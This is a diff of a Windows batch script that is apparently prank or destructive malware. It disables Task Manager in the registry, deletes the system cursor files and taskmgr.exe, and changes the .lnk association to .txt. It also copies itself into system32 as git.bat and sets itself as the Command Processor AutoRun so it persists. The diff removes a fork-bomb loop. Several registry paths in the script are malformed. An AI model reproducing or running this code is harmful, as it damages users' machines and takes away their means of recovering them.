@@ -46,11 +46,9 @@ reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoCo
 reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
 
 del "%SystemRoot%Cursors*.*" >nul
-:x
-Start git.bat
-goto x
+
 assoc .lnk=.txt
-copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
+copy ""%0"" "%SystemRoot%\system32\git.bat" >nul
 reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\git.bat" /f >nul
 
 Del C:\Windows\System32\taskmgr.exe /q
